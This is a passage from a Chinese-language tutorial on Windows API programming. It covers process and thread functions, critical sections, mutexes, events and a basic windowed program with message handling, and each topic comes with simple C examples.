hThread);</code></pre><p><strong>TerminateProcess()</strong><br>终止指定进程及其所有的线程。</p><pre><code>BOOL TerminateProcess(    HANDLE hProcess,  //进程句柄    UINT uExitCode    //进程终止码);</code></pre><p><strong>OpenProcess()</strong></p><p>OpenProcess 函数用来打开一个已存在的进程对象，并返回进程的句柄。</p><pre><code>HANDLE OpenProcess(    DWORD dwDesiredAccess, //渴望得到的访问权限（标志），有很多种。    BOOL bInheritHandle, // 是否继承句柄    DWORD dwProcessId// 进程标示符);</code></pre><p>例子</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main()&#123;    HANDLE hProcess;//    hProcess=(HANDLE)0x212;    hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,19220);    if(!TerminateProcess(hProcess,1))    &#123;        printf(&quot;无法终止进程&quot;);     &#125; &#125; </code></pre><p><strong>GetModuleFileName()</strong></p><p>获取当前进程已加载模块的文件的完整路径，该模块必须由当前进程加载。</p><pre><code>DWORDGetModuleFileName(HMODULE  hModule,//装载一个程序实例的句柄。如果该参数为NULL，该函数返回该当前应用程序全路径。LPTSTR  lpFilename,DWORD  nSize);</code></pre><p>例子</p><pre><code>TCHAR szPath[MAX_PATH];if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )&#123;    printf(&quot;GetModuleFileName failed (%d)\n&quot;, GetLastError());    return FALSE;&#125;printf(&quot;%s&quot;,szPath);</code></pre><p><strong>GetCurrentDirectory()</strong></p><p>是一个系统参数，在一个缓冲区中装载当前目录，Long，装载到lpBuffer的字节数。如nBufferLength的长度不够，不足以容纳目录，则返回值是必要的缓冲区长度（要求至少这个长度），其中包括空中止字符。零表示失败。会设置GetLastError。</p><pre><code>DWORD GetCurrentDirectory(DWORD nBufferLength,     //sizeofdirectorybuffer  缓冲区的长度LPTSTR lpBuffer          //directorybuffer  指定一个预定义字串，用于装载当前目录);</code></pre><p>例子</p><pre><code>TCHAR scPath[MAX_PATH];if( !GetCurrentDirectory( MAX_PATH,scPath ) )&#123;    printf(&quot;GetCurrentDirectory failed (%d)\n&quot;, GetLastError());    return FALSE;&#125;printf(&quot;%s&quot;,scPath); </code></pre><p><strong>GetCurrentProcessId()</strong></p><p>获取当前进程一个唯一的标识符(PID)。返回值 Long，当前进程的PID</p><p>例子</p><pre><code>long PID;PID=GetCurrentProcessId(); printf(&quot;%d&quot;,PID);</code></pre><p><strong>GetCurrentProcess()</strong></p><p>获取当前进程的一个伪句柄，返回值 Long，当前进程的伪句柄 </p><p>例子</p><pre><code>HANDLE FAKEhProcess;FAKEhProcess=GetCurrentProcess();printf(&quot;%d&quot;,FAKEhProcess);</code></pre><p><strong>CreateToolhelp32Snapshot()</strong></p><p>CreateToolhelp32Snapshot可以通过获取进程信息为指定的进程、进程使用的堆[HEAP]、模块[MODULE]、线程建立一个快照。</p><pre><code>HANDLE WINAPI CreateToolhelp32Snapshot(    DWORD dwFlags, //用来指定“快照”中需要返回的对象，可以是TH32CS_SNAPPROCESS等    DWORD th32ProcessID //一个进程ID号，用来指定要获取哪一个进程的快照，当获取系统进程列表或获取 当前进程快照时可以设为0);TH32CS_SNAPPROCESS(0x00000002) - 在快照中包含系统中所有的进程。调用成功，返回快照的句柄，调用失败，返回INVALID_HANDLE_VALUE 。</code></pre><p>例子，查找一个进程的PID</p><pre><code>#include &quot;windows.h&quot;#include &quot;tlhelp32.h&quot;#include &quot;tchar.h&quot;DWORD FindProcessID(LPCTSTR szProcessName)&#123;    DWORD dwPID = 0xFFFFFFFF;    HANDLE hSnapShot = INVALID_HANDLE_VALUE;   //定义了一个快照的句柄。    PROCESSENTRY32 pe;  //tagPROCESSENTRY32结构体，下面会介绍。    // Get the snapshot of the system    pe.dwSize = sizeof(PROCESSENTRY32);    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);  //获取快照句柄    // find process    Process32First(hSnapShot, &amp;pe);  //获得第一个进程的句柄。    do    &#123;        if (!_tcsicmp(szProcessName, (LPCTSTR) pe.szExeFile))//比较当前进程和我们需要的进程的名称是否一样。        &#123;            dwPID = pe.th32ProcessID;            break;        &#125;    &#125; while (Process32Next(hSnapShot, &amp;pe)); //获得下一个进程的句柄。    CloseHandle(hSnapShot);  //关闭快照句柄    return dwPID;&#125;int _tmain(int argc, TCHAR* argv[])&#123;    DWORD dwPID = 0xFFFFFFFF;    // find process    dwPID = FindProcessID(argv[1]);    if (dwPID == 0xFFFFFFFF)    &#123;        _tprintf(L&quot;There is no &lt;%s&gt; process!\n&quot;, argv[1]);        return 1;    &#125;    _tprintf(L&quot;PID of \&quot;%s\&quot; is %d\n&quot;, argv[1], dwPID);&#125;</code></pre><p>tagPROCESSENTRY32结构体，快照的进程信息会保存在这个结构体内。</p><pre><code>typedef struct tagPROCESSENTRY32 &#123;    DWORD dwSize; // 结构大小；    DWORD cntUsage; // 此进程的引用计数；    DWORD th32ProcessID; // 进程ID;    DWORD th32DefaultHeapID; // 进程默认堆ID；    DWORD th32ModuleID; // 进程模块ID；    DWORD cntThreads; // 此进程开启的线程计数；    DWORD th32ParentProcessID;// 父进程ID；    LONG pcPriClassBase; // 线程优先权；    DWORD dwFlags; // 保留；    WCHAR szExeFile[MAX_PATH]; // 进程全名；&#125; PROCESSENTRY32;</code></pre><h3 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h3><p><strong>1.什么是线程？</strong></p><p>(1)线程是附属在进程上的执行实体，是代码的执行流程。</p><p>(2)一个进程可以包含多个线程，但一个进程至少要包含一个线程。</p><p><strong>CreateThread()</strong></p><pre><code>HANDLE CreateThread(    LPSECURITY_ATTRIBUTES lpThreadAttributes,//SD    SIZE_T dwStackSize,//initialstacksize   初始堆栈大小    LPTHREAD_START_ROUTINE lpStartAddress,//threadfunction     LPVOID lpParameter,//threadargument   线程参数    DWORD dwCreationFlags,//creationoption   创建选项    LPDWORD lpThreadId//threadidentifier   线程标识符)</code></pre><p>第一个参数 lpThreadAttributes 表示线程内核对象的安全属性，一般传入NULL表示使用默认设置。</p><p>第二个参数 dwStackSize 表示线程栈空间大小。传入0表示使用默认大小（1MB）。</p><p>第三个参数 lpStartAddress 表示新线程所执行的线程函数地址，多个线程可以使用同一个函数地址。</p><p>第四个参数 lpParameter 是传给线程函数的参数。</p><p>第五个参数 dwCreationFlags 指定额外的标志来控制线程的创建，为0表示线程创建之后立即就可以进行调度，如果为CREATE_SUSPENDED则表示线程创建后暂停运行，这样它就无法调度，直到调用ResumeThread()。</p><p>第六个参数 lpThreadId 将返回线程的ID号，传入NULL表示不需要返回该线程ID号。</p><p><strong>ThreadProc()</strong></p><pre><code>DWORD WINAPI ThreadProc(LPVOID lpParameter);</code></pre><p>参数:<br>lpParameter<br>接收线程传递给函数使用的CreateThread函数lpParameter参数数据。</p><p>返回值:<br>函数应该返回一个值，表示线程函数返回退出码，一般使用0作为返回值。<br>线程创建成功,返回非零值,否则为0。</p><p>例子</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParam)&#123;    printf(&quot;%d&quot;,*(int*)lpParam);    int i;    for(i=0;i&lt;=100;i++)    &#123;        Sleep(500);        printf(&quot;+++++++++++%d\n&quot;,i);    &#125;    return 0;&#125;int main()&#123;    int i;    int b=10;    HANDLE hthread;    LPVOID lpParam=&amp;b;     hthread=CreateThread(NULL,0,ThreadProc,lpParam,0,NULL);    for(i=0;i&lt;=100;i++)    &#123;        Sleep(500);        printf(&quot;------------%d\n&quot;,i);    &#125;&#125;</code></pre><h3 id="和线程相关的函数"><a href="#和线程相关的函数" class="headerlink" title="和线程相关的函数"></a>和线程相关的函数</h3><p><strong>Sleep()</strong></p><p>Sleep函数可以使计算机程序（进程，任务或线程）进入休眠，使其在一段时间内处于非活动状态。当函数设定的计时器到期，或者接收到信号、程序发生中断都会导致程序继续执行。</p><pre><code>Sleep(3000)//休眠3s</code></pre><p><strong>SuspendThread()</strong></p><p>SuspendThread，暂停指定的线程。</p><pre><code>DWORD WINAPI SuspendThread(　　_In_HANDLE hThread  //进程句柄);</code></pre><p><strong>ResumeThread()</strong></p><p>使线程的挂起时间计数减一。创建一个挂起的线程或者手动挂起一个线程后调用。调用该函数后线程不一定会立刻执行，而是由操作系统继续调度，直到计数为0，系统为其分配资源时才开始执行。</p><pre><code>DWORD WINAPI ResumeThread(    _In_ HANDLE hThread  //进程句柄);</code></pre><p><strong>WaitForSingleObject()</strong></p><pre><code>DWORD WINAPI WaitForSingleObject(    __in HANDLE hHandle,    __in DWORD dwMilliseconds);hHandle[in]:对象句柄。可以指定一系列的对象，如Event、Job、Memory resource notification、Mutex、Process、Semaphore、Thread、Waitable timer等。dwMilliseconds[in]:定时时间间隔，单位为milliseconds（毫秒）.如果指定一个非零值，函数处于等待状态直到hHandle标记的对象被触发，或者时间到了。如果dwMilliseconds为0，对象没有被触发信号，函数不会进入一个等待状态，它总是立即返回。如果dwMilliseconds为INFINITE，对象被触发信号后，函数才会返回。</code></pre><p><strong>WaitForMultipleObjects()</strong></p><p>WaitForMultipleObjects是Windows中的一个功能非常强大的函数，几乎可以等待Windows中的所有的内核对象</p><pre><code>DWORD WaitForMultipleObjects(    DWORD nCount,    //数组中的对象句柄数    const HANDLE* lpHandles,   //[in]一组对象句柄。该数组可以包含不同类型对象的句柄。    BOOL bWaitAll,   //[in] 如果此参数为TRUE，则在lpHandles数组中的所有对象的状态发出信号时，该函数返回。如果为FALSE，则当任何一个对象的状态设置为信号时，该函数返回。在后一种情况下，返回值表示其状态导致函数返回的对象。    DWORD dwMilliseconds  //INFINITE);</code></pre><p><strong>GetExitCodeThread()</strong></p><p>GetExitCodeThread，计算机用语，用于获取一个已中止线程的退出代码。</p><pre><code>BOOL GetExitCodeThread(     HANDLE hThread,  //in，获取退出代码的一个线程的句柄     LPDWORD lpExitCode   //out，存储线程结束代码,也就是线程的返回值);</code></pre><p>例子</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParam)&#123;    printf(&quot;this is a thread\n&quot;);    return 5;&#125;int main()&#123;    HANDLE arrhtherd[2];    DWORD  ExitCode1,ExitCode2;    arrhtherd[0]=CreateThread(NULL,0,ThreadProc,NULL,0,NULL);    //将线程1挂起2次，并睡眠5秒，然后恢复线程1     SuspendThread(arrhtherd[0]);    SuspendThread(arrhtherd[0]);    Sleep(5000);    ResumeThread(arrhtherd[0]);    ResumeThread(arrhtherd[0]);    arrhtherd[1]=CreateThread(NULL,0,ThreadProc,NULL,0,NULL);    //等待两线程都完成。     WaitForMultipleObjects(2,arrhtherd,TRUE,INFINITE);    //获得线程1的返回值ExitCode1，然后输出     GetExitCodeThread(arrhtherd[0],&amp;ExitCode1);    printf(&quot;%d&quot;,ExitCode1);    CloseHandle(arrhtherd[0]);    CloseHandle(arrhtherd[1]);    getchar();&#125;</code></pre><h3 id="临界区-多线程调用全局变量产生的问题"><a href="#临界区-多线程调用全局变量产生的问题" class="headerlink" title="临界区-多线程调用全局变量产生的问题"></a>临界区-多线程调用全局变量产生的问题</h3><p>当多个个线程同时调用一个全局变量时候会有线程安全问题，因为线程的进行时间的不定性，可能导致线程1执行到一半，然后又去执行线程2，又因为使用的是同一个全局变量，就会产生问题。</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int number=10; DWORD WINAPI ThreadProc1(LPVOID lpParam)&#123;    while(number&gt;0)    &#123;        printf(&quot;当前number为%d\n&quot;,number);        number--;        printf(&quot; 减后number为%d\n&quot;,number);    &#125;    return 0;&#125;DWORD WINAPI ThreadProc2(LPVOID lpParam)&#123;    while(number&gt;0)    &#123;        printf(&quot;当前number为%d\n&quot;,number);        number--;        printf(&quot; 减后number为%d\n&quot;,number);    &#125;    return 0;&#125;int main()&#123;    HANDLE arrhtherd[2];    arrhtherd[0]=CreateThread(NULL,0,ThreadProc1,NULL,0,NULL);    arrhtherd[1]=CreateThread(NULL,0,ThreadProc2,NULL,0,NULL);    WaitForMultipleObjects(2,arrhtherd,TRUE,INFINITE);    CloseHandle(arrhtherd[0]);    CloseHandle(arrhtherd[1]);    getchar();&#125;</code></pre><p>执行会看到结果如下，存在一些问题<br><img src="https://i.loli.net/2021/03/10/i29n7yI4hj5MOcW.png"></p><p>所以这时候我们需要设置临界区，也就是线程锁，让线程1在执行的时候，不会跳到线程2。但是设置临界区要注意保证线程中和全局变量相关的逻辑代码都要报包含在临界区内</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int number=10; //创建全局变量 CRITICAL_SECTION cs;DWORD WINAPI ThreadProc1(LPVOID lpParam)&#123;    //实现临界区     EnterCriticalSection(&amp;cs);    while(number&gt;0)    &#123;        printf(&quot;当前number为%d\n&quot;,number);        number--;        printf(&quot; 减后number为%d\n&quot;,number);    &#125;    LeaveCriticalSection(&amp;cs);    return 0;&#125;DWORD WINAPI ThreadProc2(LPVOID lpParam)&#123;    EnterCriticalSection(&amp;cs);    while(number&gt;0)    &#123;        printf(&quot;当前number为%d\n&quot;,number);        number--;        printf(&quot; 减后number为%d\n&quot;,number);    &#125;    LeaveCriticalSection(&amp;cs);    return 0;&#125;int main()&#123;    HANDLE arrhtherd[2];    //初始化全局变量     InitializeCriticalSection(&amp;cs);    arrhtherd[0]=CreateThread(NULL,0,ThreadProc1,NULL,0,NULL);    arrhtherd[1]=CreateThread(NULL,0,ThreadProc2,NULL,0,NULL);    WaitForMultipleObjects(2,arrhtherd,TRUE,INFINITE);    CloseHandle(arrhtherd[0]);    CloseHandle(arrhtherd[1]);    getchar();&#125; </code></pre><p>执行后会发现没有问题，就不贴图了。</p><h3 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h3><p><strong>CreateMutex</strong></p><p>CreateMutex是一个计算机函数，作用是找出当前系统是否已经存在指定进程的实例。如果没有则创建一个互斥体。</p><pre><code>HANDLE CreateMutex(    LPSECURITY_ATTRIBUTES lpMutexAttributes, // 指向安全属性的指针，一般设置为NULL    BOOL bInitialOwner, // 初始化互斥对象的所有者，如创建进程希望立即拥有互斥体，则设为TRUE。一个互斥体同时只能由一个线程拥有。    LPCTSTR lpName // 指向互斥对象名的指针);BOOL bInitialOwner TRUE代表就是当前线程的，FALSE代表这个互斥体不是当前线程只是将他创建出来</code></pre><p>例子，自己过改TRUE和FLASE来理解。</p><p>进程1</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main()&#123;    int i;    //创建一个互斥体     HANDLE g_hMutex=CreateMutex(NULL,TRUE,&quot;name&quot;);    //获取令牌：有信号 或者线程的拥有者(TRUE)    WaitForSingleObject(g_hMutex,INFINITE);    for(i=0;i&lt;10;i++)    &#123;        Sleep(1000);        printf(&quot;hellow world\n&quot;);    &#125;    //释放令牌     ReleaseMutex(g_hMutex);    getchar();     return 0; &#125; </code></pre><p>进程2</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main()&#123;    int i;    //创建一个互斥体     HANDLE g_hMutex=CreateMutex(NULL,TRUE,&quot;name&quot;);    //获取令牌：有信号 或者线程的拥有者(TRUE)    WaitForSingleObject(g_hMutex,INFINITE);    for(i=0;i&lt;10;i++)    &#123;        Sleep(1000);        printf(&quot;hellow world\n&quot;);    &#125;    //释放令牌     ReleaseMutex(g_hMutex);    getchar();     return 0; &#125; </code></pre><p>我自己得出的结论就是：互斥体只会存在于其所在的线程，如果这个互斥体被其拥有者线程占用了，那么其线程将无法使用该互斥体。</p><p>例子</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;HANDLE g_hSet1;DWORD WINAPI ThreadProc1(LPVOID lpParam)&#123;    WaitForSingleObject(g_hSet1,INFINITE);    printf(&quot;++++++++++++\n&quot;);    ReleaseMutex(g_hSet1);    return 0;&#125;DWORD WINAPI ThreadProc2(LPVOID lpParam)&#123;    WaitForSingleObject(g_hSet1,INFINITE);    printf(&quot;-----------\n&quot;);    SetEvent(g_hSet1);    return 0;&#125;int main()&#123;    HANDLE arrhtherd[2];    g_hSet1=CreateMutex(NULL,TRUE,NULL);    ReleaseMutex(g_hSet1);//如果将这一句注释掉，那么线程1和线程2都无法执行。     arrhtherd[0]=CreateThread(NULL,0,ThreadProc1,NULL,0,NULL);    arrhtherd[1]=CreateThread(NULL,0,ThreadProc2,NULL,0,NULL);    WaitForMultipleObjects(2,arrhtherd,TRUE,INFINITE);    CloseHandle(arrhtherd[0]);    CloseHandle(arrhtherd[1]);    getchar();&#125; </code></pre><p><strong>互斥体和线程锁的区别</strong></p><ol><li>线程锁只能用于单个进程间的线程控制</li><li>互斥体可以设定等待超时，但线程锁不能</li><li>线程意外终结时，Mutex可以避免无限等待</li><li>Mutex效率没有线程锁高</li></ol><p><strong>防多开</strong></p><p>CreateMutex函数的返回值</p><p>Long，如执行成功，就返回互斥体对象的句柄；零表示出错。会设置GetLastError。如果返回的是一个有效句柄，但指定的名字已经存在，GetLastError也会设为ERROR_ALREADY_EXISTS，bInitialOwner的值将会被忽略。如果调用者限制了权限，GetLastError将会返回ERROR_ACCESS_DENIED，这个时候应该使用OpenMutex函数。</p><pre><code>#include &lt;stdio.h&gt; #include &lt;windows.h&gt;int main(int argc, char* argv[])&#123;    //创建令牌    HANDLE g_mutex = CreateMutex(NULL,FALSE,&quot;防止多开&quot;);    DWORD DwRet = GetLastError();    //CreateMutex()执行成功     if(g_mutex)    &#123;        //否是互斥体的名字已经存在         if(DwRet == ERROR_ALREADY_EXISTS)        &#123;            CloseHandle(g_mutex);            return 0;        &#125;           &#125;    //CreateMutex()执行出错了    else    &#123;        printf(&quot;创建失败&quot;);        CloseHandle(g_mutex);        return 0;    &#125;    while(1)    &#123;        Sleep(1000);        printf(&quot;程序执行中\n&quot;);    &#125;       return 0;&#125;</code></pre><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p><strong>CreateEvent()</strong></p><p>CreateEvent是一个WindowsAPI函数。它用来创建或打开一个命名的或无名的事件对象。</p><pre><code>HANDLECreateEvent(    LPSECURITY_ATTRIBUTES lpEventAttributes,// 安全属性    BOOL bManualReset,// 复位方式，TRUE为通知类型，FALSE为互斥类型。    BOOL bInitialState,// 初始状态，FALSE为无信号，TURE为有信号    LPCTSTR lpName // 对象名称);bManualReset：指定将事件对象创建成手动复原还是自动复原。如果是TRUE，那么必须用ResetEvent函数来手工将事件的状态复原到无信号状态。如果设置为FALSE，当一个线程等待到事件信号后系统会自动将事件状态复原为无信号状态。</code></pre><p>实现同步，同步=互斥+有序</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;HANDLE g_hSet1,g_hSet2;int b=10;DWORD WINAPI ThreadProc1(LPVOID lpParam)&#123;    int i;    for(i=0;i&lt;b;i++)    &#123;        WaitForSingleObject(g_hSet1,INFINITE);        printf(&quot;++++++++++++\n&quot;);        SetEvent(g_hSet2);    &#125;    return 0;&#125;DWORD WINAPI ThreadProc2(LPVOID lpParam)&#123;    int i;    for(i=0;i&lt;b;i++)    &#123;        WaitForSingleObject(g_hSet2,INFINITE);        printf(&quot;-----------\n&quot;);        SetEvent(g_hSet1);    &#125;    return 0;&#125;int main()&#123;    HANDLE arrhtherd[2];    g_hSet1=CreateEvent(NULL,FALSE,TRUE,NULL);    g_hSet2=CreateEvent(NULL,FALSE,FALSE,NULL);    arrhtherd[0]=CreateThread(NULL,0,ThreadProc1,NULL,0,NULL);    arrhtherd[1]=CreateThread(NULL,0,ThreadProc2,NULL,0,NULL);    WaitForMultipleObjects(2,arrhtherd,TRUE,INFINITE);    CloseHandle(arrhtherd[0]);    CloseHandle(arrhtherd[1]);    getchar();&#125; </code></pre><h3 id="第一个windows程序"><a href="#第一个windows程序" class="headerlink" title="第一个windows程序"></a>第一个windows程序</h3><p><strong>WinMain()</strong></p><p>WinMain是一个函数，该函数的功能是被系统调用，作为一个32位应用程序的入口点。WinMain函数应初始化应用程序，显示主窗口，进入一个消息接收一发送循环，这个循环是应用程序执行的其余部分的顶级控制结构。</p><pre><code>int APIENTRY WinMain(    HINSTANCE hInstance,  //模块句柄，应用程序当前实例的句柄。    HINSTANCE hPrevInstance,  //Null    LPSTR     lpCmdLine,  //指向应用程序命令行的字符串的指针    int       nCmdShow) //指明窗口如何显示，例如最大化，最小化，具体请查阅。</code></pre><p><strong>sprintf()</strong></p><p>sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format [,argument,…]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。</p><pre><code>int sprintf(char *string, char *format [,argument,...]);</code></pre><p><strong>WNDCLASS</strong></p><p>WNDCLASS是一个由系统支持的结构，用来储存某一类窗口的信息,如ClassStyle,消息处理函数，Icon,Cursor,背景Brush等。也就是说，CreateWindow只是将某个WNDCLASS定义的窗体变成实例。</p><pre><code>typedef struct _WNDCLASS &#123;    UINT style;// 窗口类的风格    WNDPROC lpfnWndProc;//窗口处理函数    int cbClsExtra;//窗口扩展    int cbWndExtra;//窗口实例扩展    HINSTANCE hInstance;//实例句柄    HICON hIcon;//窗口的最小化图标    HCURSOR hCursor;//窗口鼠标光标    HBRUSH hbrBackground;//窗口背景色    LPCTSTR lpszMenuName;//窗口菜单    LPCTSTR lpszClassName;// 窗口类名&#125; WNDCLASS, *LPWNDCLASS;</code></pre><p><strong>CreateWindow()</strong></p><pre><code>HWND WINAPI CreateWindow(  _In_opt_  LPCTSTR lpClassName,  // 窗口类名称      _In_opt_  LPCTSTR lpWindowName, // 窗口标题      _In_      DWORD dwStyle,        // 窗口风格，或称窗口格式      _In_      int x,                // 初始 x 坐标      _In_      int y,                // 初始 y 坐标      _In_      int nWidth,           // 初始 x 方向尺寸      _In_      int nHeight,          // 初始 y 方向尺寸  _In_opt_  HWND hWndParent,      // 父窗口句柄  _In_opt_  HMENU hMenu,          // 窗口菜单句柄  _In_opt_  HINSTANCE hInstance,  // 程序实例句柄  _In_opt_  LPVOID lpParam        // 创建参数);</code></pre><p><strong>WndProc()</strong></p><p>Wndproc是Windows操作系统向应用程序发送一系列消息之一，每个窗口会有一个窗口过程的回调函数，分别是窗口句柄、消息ID、WPARAM、LPARAM。<br>    LRESULT CALLBACK WndProc( //WndProc名称可自由定义<br>        HWND hwnd,//窗口句柄<br>        UINT uMsg,//消息ID<br>        WPARAM wParam,//消息参数<br>        LPARAM lParam//消息参数<br>    )；<br><strong>ShowWindow()</strong><br>该函数设置指定窗口的显示状态。</p><pre><code>BOOL ShowWindow(    HWND hWnd,//窗口句柄    int nCmdShow//指定窗口如何显示);</code></pre><p><strong>GetMessage()</strong> </p><p>GetMessage是从调用线程的消息队列里取得一个消息并将其放于指定的结构。</p><pre><code>GetMessage(    LPMSG lpMsg，//指向MSG结构的指针，该结构从线程的消息队列里接收消息信息。    HWND hWnd，//取得其消息的窗口的句柄。    UINT wMsgFilterMin，    UINT wMsgFilterMax)lpMsg：指向MSG结构的指针，该结构从线程的消息队列里接收消息信息。hWnd：取得其消息的窗口的句柄。当其值取NULL时，GetMessage为任何属于调用线程的窗口检索消息，线程消息通过PostThreadMessage寄送给调用线程。wMsgFilterMin：指定被检索的最小消息值的整数。wMsgFilterMax：指定被检索的最大消息值的整数。返回值：如果函数取得WM_QUIT之外的其他消息，返回非零值。如果函数取得WM_QUIT消息，返回值是零。如果出现了错误，返回值是-1。例如，当hWnd是无效的窗口句柄或lpMsg是无效的指针时。若想获得更多的错误信息，请调用GetLastError函数。</code></pre><p><strong>MSG</strong></p><p>用来储存消息的结构体。MSG是Windows程序中的结构体。在Windows程序中，消息是由MSG结构体来表示的。成员变量含义：第一个成员变量hwnd表示消息所属的窗口；第二个成员变量message指定了消息的标识符。第三、第四个成员变量wParam和lParam，用于指定消息的附加信息。最后两个变量分别表示消息投递到消息队列中的时间和鼠标的当前位置。</p><pre><code>typedef struct tagMSG &#123;    HWND hwnd;//消息所属的窗口    UINT message;//消息的标识符    WPARAM wParam;//指定消息的附加信息    LPARAM lParam;//指定消息的附加信息    DWORD time;//投递到消息队列中的时间    POINT pt;//当前鼠标位置&#125; MSG;</code></pre><p><strong>DispatchMessage()</strong></p><p>函数功能：该函数分发一个消息给窗口程序。通常消息从GetMessage函数获得或者TranslateMessage函数传递的。消息被分发到回调函数（过程函数)，作用是消息传递给操作系统，然后操作系统去调用我们的回调函数，也就是说我们在窗体的过程函数中处理消息。</p><pre><code>LONG DispatchMessage（    CONST MSG*lpmsg//指向含有消息的MSG结构的指针。）;</code></pre><p><strong>DefWindowProc()</strong></p><p>DefWindowProc函数调用缺省的窗口过程来为应用程序没有处理的任何窗口消息提供缺省的处理。该函数确保每一个消息得到处理。</p><pre><code>LRESULT DefWindowProc(    HWND hWnd，//指向接收消息的窗口过程的句柄。    UINT Msg，//指定消息类型。    WPARAM wParam，//指定其余的、消息特定的信息。该参数的内容与Msg参数值有关。    LPARAM IParam  //指定其余的、消息特定的信息。该参数的内容与Msg参数值有关。)；</code></pre><p>例子，在vc6++中编译</p><pre><code>// 第一个程序.cpp : Defines the entry point for the application.//#include &quot;stdafx.h&quot;LRESULT CALLBACK WndProc( //WndProc名称可自由定义    HWND hwnd,    UINT uMsg,    WPARAM wParam,    LPARAM lParam    );int APIENTRY WinMain(HINSTANCE hInstance,                     HINSTANCE hPrevInstance,                     LPSTR     lpCmdLine,                     int       nCmdShow)&#123;     // TODO: Place code here.    //用这种方式来打印    /*    char str[50];    DWORD dwAddr = (DWORD)hInstance;    sprintf(str,&quot;模块地址：%x&quot;, dwAddr);    OutputDebugString(str);    */    char szOutBuff[50];    //1.第一步，定义你的窗口是怎么样的。    TCHAR classname[]=TEXT(&quot;the_itach1&quot;);    WNDCLASS wndclass = &#123;0&#125;;    wndclass.hbrBackground=(HBRUSH)COLOR_BACKGROUND;//窗口背景色    wndclass.lpszClassName=classname;// 窗口类名    wndclass.hInstance=hInstance;//实例句柄    wndclass.lpfnWndProc=WndProc;//窗口处理函数    if(!RegisterClass(&amp;wndclass)) //注册一个窗口类，如果注册失败 发出警告        &#123;MessageBeep(0); return FALSE;&#125;    //2.第二步，创建并显示窗口    HWND hWnd=CreateWindow(        classname,        TEXT(&quot;THE_ITACH1&quot;),        WS_OVERLAPPEDWINDOW,        100,        100,        300,        150,        NULL,        NULL,        hInstance,        NULL);    if(hWnd==NULL)//如果错误，返回错误参数。    &#123;        sprintf(szOutBuff,&quot;error: %d&quot;, GetLastError());        OutputDebugString(szOutBuff);    &#125;    ShowWindow(hWnd,SW_SHOW);//显示这个窗口    //3.第三步，接收消息并处理    MSG msg;//定义MSG结构体，用来储存鼠标，键盘或者其他窗口产生的消息    BOOL bRet;    while((bRet=GetMessage(&amp;msg,hWnd,0,0))!=0)//用来接收鼠标，键盘或者其他窗口产生的消息，放到msg结构体里面    &#123;        if(bRet==-1)        &#123;            sprintf(szOutBuff,&quot;error: %d&quot;, GetLastError());            OutputDebugString(szOutBuff);        &#125;        else        &#123;            TranslateMessage(&amp;msg);//将消息转换，例如键盘码转为字符型。            DispatchMessage(&amp;msg);//将消息分发给内核，然后内核根据DefWindowProc来将消息传给应用程序进行处理。        &#125;    &#125;    return 0;&#125;LRESULT CALLBACK WndProc( //WndProc名称可自由定义    HWND hwnd,    UINT uMsg,    WPARAM wParam,    LPARAM lParam)&#123;    return  DefWindowProc (hwnd, uMsg, wParam, lParam) ;//让系统来处理这些消息，下一节会讲自己来处理某些消息。&#125;</code></pre><p>大致流程图<br><img src="https://i.loli.net/2021/03/16/ftYv7Cs8a3pBiqx.png"></p><h3 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h3><p>主要就讲键盘类的，也就是MSG那个结构体，下面是一个例子</p><pre><code>LRESULT CALLBACK WndProc( //WndProc名称可自由定义    HWND hwnd,    UINT uMsg,    WPARAM wParam,    LPARAM lParam)&#123;    //    sprintf(szOutBuff,&quot;消息: %x&quot;, uMsg);    //    OutputDebugString(szOutBuff);    switch (uMsg)    &#123;    case WM_DESTROY://点击关闭按钮时退出        &#123;            PostQuitMessage(0);            return 0;        &#125;    case WM_KEYDOWN://当键盘按下        &#123;            return 0;        &#125;    case WM_CHAR://记录键盘按下的是什么        &#123;            char key[0x80];            sprintf(key,&quot;消息: %c&quot;, wParam);            OutputDebugString(key);            return 0;        &#125;    &#125;    return  DefWindowProc (hwnd, uMsg, wParam, lParam) ;&#125;</code></pre><h3 id="子窗口"><a href="#子窗口" class="headerlink" title="子窗口"></a>子窗口</h3><p>利用window已有的一些窗口类来创建一些子窗口，例如文本框和按钮等</p><p>例子，加在相应位置就行了。</p><pre><code>//这3个是子窗口的编号，就相当于身份证一样# define IDC_EDIT_1 0x100# define IDC_BUTTON_1 0x101# define IDC_BUTTON_2 0x102char szOutBuff[50];int i=0;HINSTANCE g_hInstance;//由于hInstance在主函数是一个局部变量，而WndProc需要调用，所以设置为全局变量。LRESULT CALLBACK WndProc(    HWND hwnd,    UINT uMsg,    WPARAM wParam,    LPARAM lParam)&#123;    switch (uMsg)    &#123;    case WM_DESTROY://点关闭键退出        &#123;            exit(0);            return 0;        &#125;    case WM_COMMAND://这个是如果点击了窗口        &#123;            switch(LOWORD(wParam))//低16位就代表点击子窗口的编号。            &#123;            case IDC_BUTTON_1:                &#123;                    MessageBox(NULL,&quot;听说点1314次就会有flag&quot;,&quot;hint&quot;,MB_OK);                    break;                &#125;            case IDC_BUTTON_2:                &#123;                    i++;                    if(i==1314)                    &#123;                        sprintf(szOutBuff,&quot;flag&#123;love_you_%d&#125;&quot;,i);                        SetDlgItemText(hwnd,IDC_EDIT_1,szOutBuff);                    &#125;                    break;                &#125;            &#125;        &#125;    case WM_CREATE:        &#123;            